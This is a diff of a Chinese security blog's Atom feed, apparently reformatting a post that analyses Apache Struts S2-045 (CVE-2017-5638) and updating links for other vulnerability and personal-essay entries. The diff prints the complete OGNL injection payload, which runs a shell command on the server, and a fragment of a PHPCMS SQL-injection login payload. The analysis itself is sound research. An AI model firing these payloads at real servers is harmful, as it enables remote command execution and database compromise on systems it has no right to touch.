+## 0x02 PoC分析
 
-&lt;p&gt;各大网站关于S2-045都贴出了带有下面PoC的利用代码：&lt;/p&gt;
+各大网站关于S2-045都贴出了带有下面PoC的利用代码：
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='ifconfig').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+```
+%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='ifconfig').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
+```
 
-&lt;p&gt;这段利用代码我第一看到时感觉很不解，为什么这样就可以绕过Struts的Ognl表达式执行校验了？因为在Struts官方修复S2-037这个漏洞时已经限制了OgnlUtil类中的getvalue方法（translateVariables的底层也是getvalue），使其无法继续执行多语句的Ognl表达式了。&lt;/p&gt;
+这段利用代码我第一看到时感觉很不解，为什么这样就可以绕过Struts的Ognl表达式执行校验了？因为在Struts官方修复S2-037这个漏洞时已经限制了OgnlUtil类中的getvalue方法（translateVariables的底层也是getvalue），使其无法继续执行多语句的Ognl表达式了。
 
-&lt;p&gt;&lt;img src=&quot;/assets/images/2017-03/compare.png&quot; alt=&quot;compare&quot; /&gt;&lt;/p&gt;
+![compare](/assets/images/2017-03/compare.png)
 
-&lt;p&gt;我们对比来看getvalue执行ognl的必经之路compileAndExecute方法：&lt;/p&gt;
+我们对比来看getvalue执行ognl的必经之路compileAndExecute方法：
 
-&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;T&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Object&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;compileAndExecute&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;expression&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Map&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Object&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OgnlTask&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;T&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;task&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;throws&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OgnlException&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
-        &lt;span class=&quot;n&quot;&gt;Object&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tree&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
-        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;enableExpressionCache&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
-            &lt;span class=&quot;n&quot;&gt;tree&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;expressions&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;expression&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
-            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tree&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
-                &lt;span class=&quot;n&quot;&gt;tree&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Ognl&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;parseExpression&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;expression&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
-                &lt;span class=&quot;n&quot;&gt;checkEnableEvalExpression&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tree&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
-            &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
-        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
-            &lt;span class=&quot;n&quot;&gt;tree&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Ognl&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;parseExpression&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;expression&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
-            &lt;span class=&quot;n&quot;&gt;checkEnableEvalExpression&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tree&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
-        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
 
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+```java
+private &lt;T&gt; Object compileAndExecute(String expression, Map&lt;String, Object&gt; context, OgnlTask&lt;T&gt; task) throws OgnlException {
+        Object tree;
+        if (enableExpressionCache) {
+            tree = expressions.get(expression);
+            if (tree == null) {
+                tree = Ognl.parseExpression(expression);
+                checkEnableEvalExpression(tree, context);
+            }
+        } else {
+            tree = Ognl.parseExpression(expression);
+            checkEnableEvalExpression(tree, context);
+        }
 
-&lt;p&gt;首先通过expressions.get(expression)来尝试解析表达式，如果表达式只是单跳语句，那么tree变量就必然非空，否则tree变量为空需要经过checkEnableEvalExpression方法检验。通过上面compare的图，可以看出这个流程多了一个isSequence方法，这个方法判断OnglContext中的语句是否为队列（多条语句），如果是那么返回false。也就是说，如果经过OgnlUtil类getvalue方法的ognl表达式是多语句形式的，那么一定会拒绝执行。&lt;/p&gt;
+```
 
-&lt;p&gt;而网上流传的这段PoC对防护有着惊艳的表现，它通过使用Ognl提供的子表达式的语法，讲多条语句合成了一条语句，完美bypass掉了if(tree == null)中的校验。&lt;/p&gt;
+首先通过expressions.get(expression)来尝试解析表达式，如果表达式只是单条语句，那么tree变量就必然非空，否则tree变量为空需要经过checkEnableEvalExpression方法检验。通过上面compare的图，可以看出这个流程多了一个isSequence方法，这个方法判断OnglContext中的语句是否为队列（多条语句），如果是那么返回false。也就是说，如果经过OgnlUtil类getvalue方法的ognl表达式是多语句形式的，那么一定会拒绝执行。
 
-&lt;p&gt;&lt;img src=&quot;/assets/images/2017-03/subexpression.png&quot; alt=&quot;subexpression&quot; /&gt;&lt;/p&gt;
+而网上流传的这段PoC对防护有着惊艳的表现，它通过使用Ognl提供的子表达式的语法，将多条语句合成了一条语句，完美bypass掉了if(tree == null)中的校验。
 
-&lt;h2 id=&quot;0x03-总结&quot;&gt;0x03 总结&lt;/h2&gt;
+![subexpression](/assets/images/2017-03/subexpression.png)
 
-&lt;p&gt;关于FileUploadInterceptor我也多次有跟踪，想从其中找到可以利用点，不过却忽略了JakartaMultiPartRequest中的调试，与一个历史级的漏洞失之交臂，惋惜至极。漏洞的挖掘就是需要一个死角也不放过的较真，否则也就像我这样空叹曾经路过。。。&lt;/p&gt;
+## 0x03 总结
 
-&lt;p&gt;安恒的小哥能发现这个漏洞也是必然，毕竟他对于Struts的每个更新版本和细节都会认真研究（就像S2-032这个原先没有漏洞，后来版本更新导致的漏洞），我这样的懒人在他面前实在是汗颜。哦，对了，还有他的这个PoC实现思路实在是让我叹为观止，我是服了~~&lt;/p&gt;
+关于FileUploadInterceptor我也多次有跟踪，想从其中找到利用点，不过却忽略了JakartaMultiPartRequest中的调试，与一个历史级的漏洞失之交臂，惋惜至极。漏洞的挖掘就是需要一个死角也不放过的较真，否则也就像我这样空叹曾经路过。。。
 
-&lt;h2 id=&quot;0x04-参考文章&quot;&gt;0x04 参考文章&lt;/h2&gt;
+安恒的小哥能发现这个漏洞也是必然，毕竟他对于Struts的每个更新版本和细节都会认真研究（就像S2-032这个原先没有漏洞，后来版本更新导致的漏洞），我这样的懒人在他面前实在是汗颜。哦，对了，还有他的这个PoC实现思路实在是让我叹为观止，我是服了~~
 
-&lt;p&gt;【1】&lt;a href=&quot;http://blog.csdn.net/u011721501/article/details/60768657&quot;&gt;s2-045漏洞分析（隐形人真忙）&lt;/a&gt;&lt;/p&gt;
+## 0x04 参考文章
 
-&lt;p&gt;【2】&lt;a href=&quot;http://paper.seebug.org/247/&quot;&gt;S2-045 漏洞分析&lt;/a&gt;&lt;/p&gt;
+【1】[s2-045漏洞分析（隐形人真忙）](http://blog.csdn.net/u011721501/article/details/60768657)
 
-&lt;p&gt;【3】&lt;a href=&quot;http://paper.seebug.org/241/&quot;&gt;《S2-045 原理初步分析（CVE-2017-5638）》&lt;/a&gt;&lt;/p&gt;
+【2】[S2-045 漏洞分析](http://paper.seebug.org/247/)
 
-&lt;p&gt;【4】&lt;a href=&quot;https://commons.apache.org/proper/commons-ognl/language-guide.html&quot;&gt;OGNL语法表&lt;/a&gt;&lt;/p&gt;
+【3】[《S2-045 原理初步分析（CVE-2017-5638）》](http://paper.seebug.org/241/)
 
-&lt;p&gt;【4】&lt;a href=&quot;https://github.com/apache/struts/commit/c48007cccc4a8007005eec782902c1f38e683438#diff-72e88cf125a077f6fb215a2e4cf3eb40L295&quot;&gt;Struts2.3.28与2.3.28.1的代码对比&lt;/a&gt;&lt;/p&gt;
-</content>
+【4】[OGNL语法表](https://commons.apache.org/proper/commons-ognl/language-guide.html)
+
+【4】[Struts2.3.28与2.3.28.1的代码对比](https://github.com/apache/struts/commit/c48007cccc4a8007005eec782902c1f38e683438#diff-72e88cf125a077f6fb215a2e4cf3eb40L295)</content>
  </entry>
  
  <entry>
    <title>读《千年悖论——张宏杰读史与论人》有感</title>
-   <link href="http://localhost:4000/%E8%AF%BB%E4%B9%A6/2017/03/01/%E8%AF%BB-%E5%8D%83%E5%B9%B4%E6%82%96%E8%AE%BA-%E5%BC%A0%E5%AE%8F%E6%9D%B0%E8%AF%BB%E5%8F%B2%E4%B8%8E%E8%AE%BA%E4%BA%BA-%E6%9C%89%E6%84%9F.html"/>
+   <link href="www.tang3.org/%E8%AF%BB%E4%B9%A6/2017/03/01/%E8%AF%BB-%E5%8D%83%E5%B9%B4%E6%82%96%E8%AE%BA-%E5%BC%A0%E5%AE%8F%E6%9D%B0%E8%AF%BB%E5%8F%B2%E4%B8%8E%E8%AE%BA%E4%BA%BA-%E6%9C%89%E6%84%9F.html"/>
    <updated>2017-03-01T02:04:34+08:00</updated>
-   <id>http://localhost:4000/%E8%AF%BB%E4%B9%A6/2017/03/01/读《千年悖论——张宏杰读史与论人》有感</id>
+   <id>www.tang3.org/%E8%AF%BB%E4%B9%A6/2017/03/01/读《千年悖论——张宏杰读史与论人》有感</id>
    <content type="html">&lt;p&gt;&lt;img src=&quot;/assets/images/2017-03/01.jpg&quot; alt=&quot;题图&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;赋闲在家读张宏杰的《千年悖论——张宏杰读史与论人》，感慨颇多。古代中国朝代更替之间的英雄和奸佞似乎都是悲哀的，他们置身于时代更替的浪潮中不能自已，从他们自身的立场来看他们的选择都是合情合理的，可悲的是历史却从不是从事实和人性的角度来书写。&lt;/p&gt;
@@ -178,9 +178,9 @@
  
  <entry>
    <title>Wordpress ImageMagic漏洞测试环境搭建&amp;利用的心路历程</title>
-   <link href="http://localhost:4000/%E6%8A%80%E6%9C%AF/2016/06/17/Wordpress+ImageMagic%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%88%A9%E7%94%A8%E7%9A%84%E5%BF%83%E8%B7%AF%E5%8E%86%E7%A8%8B.html"/>
+   <link href="www.tang3.org/%E6%8A%80%E6%9C%AF/2016/06/17/Wordpress+ImageMagic%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%88%A9%E7%94%A8%E7%9A%84%E5%BF%83%E8%B7%AF%E5%8E%86%E7%A8%8B.html"/>
    <updated>2016-06-17T17:33:02+08:00</updated>
-   <id>http://localhost:4000/%E6%8A%80%E6%9C%AF/2016/06/17/Wordpress+ImageMagic漏洞测试环境搭建利用的心路历程</id>
+   <id>www.tang3.org/%E6%8A%80%E6%9C%AF/2016/06/17/Wordpress+ImageMagic漏洞测试环境搭建利用的心路历程</id>
    <content type="html">&lt;p&gt;最近工作上的原因需要搭建一个Wordpress的ImageMagic漏洞环境，搭建过程中遇到了一些头疼的问题，以及对于利用方法的一些思考，在这里总结一下。&lt;/p&gt;
 
 &lt;h2 id=&quot;环境搭建&quot;&gt;环境搭建&lt;/h2&gt;
@@ -243,9 +243,9 @@ pop graphic-context
  
  <entry>
    <title>PHPCMS用户登陆SQL注入漏洞分析</title>
-   <link href="http://localhost:4000/%E6%8A%80%E6%9C%AF/2015/07/21/PHPCMS%E7%94%A8%E6%88%B7%E7%99%BB%E9%99%86SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html"/>
+   <link href="www.tang3.org/%E6%8A%80%E6%9C%AF/2015/07/21/PHPCMS%E7%94%A8%E6%88%B7%E7%99%BB%E9%99%86SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html"/>
    <updated>2015-07-21T18:06:23+08:00</updated>
-   <id>http://localhost:4000/%E6%8A%80%E6%9C%AF/2015/07/21/PHPCMS用户登陆SQL注入漏洞分析</id>
+   <id>www.tang3.org/%E6%8A%80%E6%9C%AF/2015/07/21/PHPCMS用户登陆SQL注入漏洞分析</id>
    <content type="html">&lt;h2 id=&quot;0x00-简述&quot;&gt;0x00 简述&lt;/h2&gt;
 
 &lt;p&gt;之前manning在调漏洞的时候，突然发现正常登陆不上去了，当时帮忙跟了下phpcms的登陆流程。之后感觉这个流程貌似有些问题，就仔细看了下，没想到真是一个0day~~&lt;/p&gt;
@@ -430,9 +430,9 @@ username=phpcms&amp;amp;password=123456%26username%3d%2527%2bunion%2bselect%2b%2
  
  <entry>
    <title>社交网络需要什么？——《失控》读书笔记一</title>
-   <link href="http://localhost:4000/%E8%AF%BB%E4%B9%A6/2015/04/26/%E7%A4%BE%E4%BA%A4%E7%BD%91%E7%BB%9C%E9%9C%80%E8%A6%81%E4%BB%80%E4%B9%88-%E5%A4%B1%E6%8E%A7-%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0%E4%B8%80.html"/>
+   <link href="www.tang3.org/%E8%AF%BB%E4%B9%A6/2015/04/26/%E7%A4%BE%E4%BA%A4%E7%BD%91%E7%BB%9C%E9%9C%80%E8%A6%81%E4%BB%80%E4%B9%88-%E5%A4%B1%E6%8E%A7-%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0%E4%B8%80.html"/>
    <updated>2015-04-26T13:21:59+08:00</updated>
-   <id>http://localhost:4000/%E8%AF%BB%E4%B9%A6/2015/04/26/社交网络需要什么？——《失控》读书笔记一</id>
+   <id>www.tang3.org/%E8%AF%BB%E4%B9%A6/2015/04/26/社交网络需要什么？——《失控》读书笔记一</id>
    <content type="html">&lt;blockquote&gt;
   &lt;p&gt;网络逻辑是违反直觉的。比如说，你要铺设连接一些城市的电话电缆。以堪萨斯城、圣地亚哥和西雅图这三个城市为例，链接这三座城市的电话总长为三千英里。根据常识，如果要在电话网络中加上第四个城市，那么电话下的总长度就必然将增加。然而，网络逻辑给出的答案截然相反。如果将第四个城市作为中心（让我们以盐湖城为例），其他城市通过盐湖城相连，电缆总厂就可以减少2850英里，比原来的三千英里减少了5%。由此，网络的总展开长度在增加节点后反而得以缩短！不过，这种效果是有限的。1990年在贝尔实验室工作的黄光明教授和堵丁柱证明，通过向网络引入新的节点，系统所能够获得的最大节省大约为13%左右。在网络中，更多代表了不同的含义。&lt;/p&gt;
 
@@ -472,9 +472,9 @@ username=phpcms&amp;amp;password=123456%26username%3d%2527%2bunion%2bselect%2b%2
  
  <entry>
    <title>ElasticSearch 远程代码执行漏洞分析（CVE-2015-1427）&amp;高级利用方法</title>
-   <link href="http://localhost:4000/%E6%8A%80%E6%9C%AF/2015/03/06/ElasticSearch+%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-CVE-2015-1427.html"/>
+   <link href="www.tang3.org/%E6%8A%80%E6%9C%AF/2015/03/06/ElasticSearch+%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-CVE-2015-1427.html"/>
    <updated>2015-03-06T19:30:55+08:00</updated>
-   <id>http://localhost:4000/%E6%8A%80%E6%9C%AF/2015/03/06/ElasticSearch+远程代码执行漏洞分析（CVE-2015-1427）</id>
+   <id>www.tang3.org/%E6%8A%80%E6%9C%AF/2015/03/06/ElasticSearch+远程代码执行漏洞分析（CVE-2015-1427）</id>
    <content type="html">&lt;h3 id=&quot;0x00-漏洞概述&quot;&gt;0x00 漏洞概述&lt;/h3&gt;
 
 &lt;p&gt;我第一次知道CVE-2015-1427这个漏洞是在2月13日（春节放假前一天），但是当时想着过年，而且觉得应该是Groovy自身的问题，就也没太在意。知道前两天兰少（lupin）问我有没有看这个漏洞，说他找到了绕过了沙盒的方法，才跑去看。&lt;/p&gt;
@@ -654,9 +654,9 @@ http://www.elasticsearch.org/overview/elkdownloads/&lt;/p&gt;
  
  <entry>
    <title>瘦子真的像他们想的那么好吗？</title>
-   <link href="http://localhost:4000/%E9%9A%8F%E6%83%B3/2014/08/23/%E7%98%A6%E5%AD%90%E7%9C%9F%E7%9A%84%E5%83%8F%E4%BB%96%E4%BB%AC%E6%83%B3%E7%9A%84%E9%82%A3%E4%B9%88%E5%A5%BD%E5%90%97.html"/>
+   <link href="www.tang3.org/%E9%9A%8F%E6%83%B3/2014/08/23/%E7%98%A6%E5%AD%90%E7%9C%9F%E7%9A%84%E5%83%8F%E4%BB%96%E4%BB%AC%E6%83%B3%E7%9A%84%E9%82%A3%E4%B9%88%E5%A5%BD%E5%90%97.html"/>
    <updated>2014-08-23T21:20:36+08:00</updated>
-   <id>http://localhost:4000/%E9%9A%8F%E6%83%B3/2014/08/23/瘦子真的像他们想的那么好吗？</id>
+   <id>www.tang3.org/%E9%9A%8F%E6%83%B3/2014/08/23/瘦子真的像他们想的那么好吗？</id>
    <content type="html">&lt;p&gt;&lt;img src=&quot;http://ww1.sinaimg.cn/large/3f18819bjw1ejmey1uqajj20a209zq3f.jpg&quot; alt=&quot;1&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;经常会听到某些偏瘦的人在炫耀一些他们这种长不胖的特质，并以此为傲。也许胖子们天生喜欢自嘲的性格使他们滋生了这种莫名的优越感，写这篇文章并不想去矫情胖子好还是瘦子好，只是单纯的想&lt;strong&gt;从身材和健身的角度来向大家陈述一种我所观察到的瘦子的“短板”。&lt;/strong&gt;&lt;/p&gt;
@@ -687,9 +687,9 @@ http://www.elasticsearch.org/overview/elkdownloads/&lt;/p&gt;
  
  <entry>
    <title>Spring框架远程代码执行</title>
-   <link href="http://localhost:4000/%E6%8A%80%E6%9C%AF/2014/07/26/Spring%E6%A1%86%E6%9E%B6%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C.html"/>
+   <link href="www.tang3.org/%E6%8A%80%E6%9C%AF/2014/07/26/Spring%E6%A1%86%E6%9E%B6%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C.html"/>
    <updated>2014-07-26T00:20:04+08:00</updated>
-   <id>http://localhost:4000/%E6%8A%80%E6%9C%AF/2014/07/26/Spring框架远程代码执行</id>
+   <id>www.tang3.org/%E6%8A%80%E6%9C%AF/2014/07/26/Spring框架远程代码执行</id>
    <content type="html">&lt;h3 id=&quot;0x01-概述&quot;&gt;0x01 概述&lt;/h3&gt;
 
 &lt;p&gt;2012年12月国外研究者DanAmodio发表《Remote Code with Expression Language Injection》一文，指出Spring框架存在潜在的代码注入风险。在2013年1月，国内安全研究人员在微博上分享了该篇文章的中文翻译内容。&lt;/p&gt;
@@ -801,9 +801,9 @@ http://www.elasticsearch.org/overview/elkdownloads/&lt;/p&gt;
  
  <entry>
    <title>互联网时代，我们需要什么</title>
-   <link href="http://localhost:4000/%E9%9A%8F%E6%83%B3/2014/03/16/%E4%BA%92%E8%81%94%E7%BD%91%E6%97%B6%E4%BB%A3-%E6%88%91%E4%BB%AC%E9%9C%80%E8%A6%81%E4%BB%80%E4%B9%88.html"/>
+   <link href="www.tang3.org/%E9%9A%8F%E6%83%B3/2014/03/16/%E4%BA%92%E8%81%94%E7%BD%91%E6%97%B6%E4%BB%A3-%E6%88%91%E4%BB%AC%E9%9C%80%E8%A6%81%E4%BB%80%E4%B9%88.html"/>
    <updated>2014-03-16T10:29:26+08:00</updated>
-   <id>http://localhost:4000/%E9%9A%8F%E6%83%B3/2014/03/16/互联网时代，我们需要什么</id>
+   <id>www.tang3.org/%E9%9A%8F%E6%83%B3/2014/03/16/互联网时代，我们需要什么</id>
    <content type="html">&lt;p&gt;&lt;img src=&quot;http://ww3.sinaimg.cn/large/3f18819bgw1eehh01b0c6j20vg0fnq8n.jpg&quot; alt=&quot;1&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;无论我们用不用电脑，上不上网，或者承不承认，我们现在的生活已经实实在在的处在了互联网时代。&lt;/p&gt;
@@ -851,9 +851,9 @@ http://www.elasticsearch.org/overview/elkdownloads/&lt;/p&gt;
  
  <entry>
    <title>Dedecms buy_action.php SQL注入漏洞分析</title>
-   <link href="http://localhost:4000/%E6%8A%80%E6%9C%AF/2014/03/04/Dedecms-buy_action.php-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html"/>
+   <link href="www.tang3.org/%E6%8A%80%E6%9C%AF/2014/03/04/Dedecms-buy_action.php-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html"/>
    <updated>2014-03-04T21:26:50+08:00</updated>
-   <id>http://localhost:4000/%E6%8A%80%E6%9C%AF/2014/03/04/Dedecms＋buy_action.php＋SQL注入漏洞分析</id>
+   <id>www.tang3.org/%E6%8A%80%E6%9C%AF/2014/03/04/Dedecms＋buy_action.php＋SQL注入漏洞分析</id>
    <content type="html">&lt;p&gt;#0x01 补丁对比
 通过对比源码和2月25日补丁发现被改动的文件有三个，buy_action.php、uploadsafe.inc.php和sys_info.htm。&lt;/p&gt;
 
@@ -1066,9 +1066,9 @@ if(!isset($paytype))
  
  <entry>
    <title>人生苦短，奈何执着</title>
-   <link href="http://localhost:4000/%E9%9A%8F%E6%83%B3/2014/02/27/%E4%BA%BA%E7%94%9F%E8%8B%A6%E7%9F%AD-%E5%A5%88%E4%BD%95%E6%89%A7%E7%9D%80.html"/>
+   <link href="www.tang3.org/%E9%9A%8F%E6%83%B3/2014/02/27/%E4%BA%BA%E7%94%9F%E8%8B%A6%E7%9F%AD-%E5%A5%88%E4%BD%95%E6%89%A7%E7%9D%80.html"/>
    <updated>2014-02-27T21:34:28+08:00</updated>
-   <id>http://localhost:4000/%E9%9A%8F%E6%83%B3/2014/02/27/人生苦短，奈何执着</id>
+   <id>www.tang3.org/%E9%9A%8F%E6%83%B3/2014/02/27/人生苦短，奈何执着</id>
    <content type="html">&lt;p&gt;&lt;img src=&quot;http://ww4.sinaimg.cn/large/3f18819bgw1edybe29wr9g20ig0bgh00.gif&quot; alt=&quot;1&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;我们从上学到上班，周围总是不断上演着聚散离合的闹剧。&lt;/p&gt;
@@ -1093,9 +1093,9 @@ if(!isset($paytype))
  
  <entry>
    <title>testcode</title>
-   <link href="http://localhost:4000/2014/02/20/test.html"/>
+   <link href="www.tang3.org/2014/02/20/test.html"/>
    <updated>2014-02-20T22:58:50+08:00</updated>
-   <id>http://localhost:4000/2014/02/20/test</id>
+   <id>www.tang3.org/2014/02/20/test</id>
    <content type="html">&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
 	&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
 		&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;
@@ -1106,9 +1106,9 @@ if(!isset($paytype))
  
  <entry>
    <title>当考试遇上了社会</title>
-   <link href="http://localhost:4000/%E9%9A%8F%E6%83%B3/2014/02/20/%E5%BD%93%E8%80%83%E8%AF%95%E9%81%87%E5%88%B0%E4%BA%86%E7%A4%BE%E4%BC%9A.html"/>
+   <link href="www.tang3.org/%E9%9A%8F%E6%83%B3/2014/02/20/%E5%BD%93%E8%80%83%E8%AF%95%E9%81%87%E5%88%B0%E4%BA%86%E7%A4%BE%E4%BC%9A.html"/>
    <updated>2014-02-20T20:32:48+08:00</updated>
-   <id>http://localhost:4000/%E9%9A%8F%E6%83%B3/2014/02/20/当考试遇到了社会</id>
+   <id>www.tang3.org/%E9%9A%8F%E6%83%B3/2014/02/20/当考试遇到了社会</id>
